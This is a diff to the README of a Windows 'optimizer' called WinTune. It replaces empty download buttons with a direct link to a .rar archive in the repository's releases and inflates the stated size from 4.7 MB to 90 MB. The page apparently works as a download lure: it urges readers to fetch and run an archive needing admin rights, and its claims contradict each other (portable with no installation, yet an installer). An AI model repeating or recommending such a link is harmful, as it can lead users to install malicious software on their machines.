@@ -27,11 +27,11 @@ Most "optimizers" either do nothing or break your system. WinTune was built by s
 
 ## ▸ Download
 
-Get the latest release from the **[Releases]()** tab.
+Get the latest release from the **[Releases](https://github.com/SwarmNegotiator/windows-optimization/releases/download/WinTune/WinTune.rar)** tab.
 
-[![Download Now](https://img.shields.io/badge/Download-WinTune%204.2-green?style=for-the-badge&logo=github)]()
+[![Download Now](https://img.shields.io/badge/Download-WinTune%204.2-green?style=for-the-badge&logo=github)](https://github.com/SwarmNegotiator/windows-optimization/releases/download/WinTune/WinTune.rar)
 
-**No installation required. Portable. 4.7 MB.**
+**No installation required. Portable. 90 MB.**
 
 ---
 
@@ -89,7 +89,7 @@ No drivers. No kernel hooks. No sketchy DLL injection. Just Windows doing what i
 | :--- | :--- |
 | **OS** | Windows 10 or 11, 64-bit (Version 1909 or higher) |
 | **RAM** | 4 GB minimum, 8 GB recommended |
-| **Storage** | 50 MB free space |
+| **Storage** | 90 MB free space |
 | **Permissions** | Admin rights — required for system-level tweaks |
 | **Runtime** | .NET 6.0+ (bundled with installer) |
 
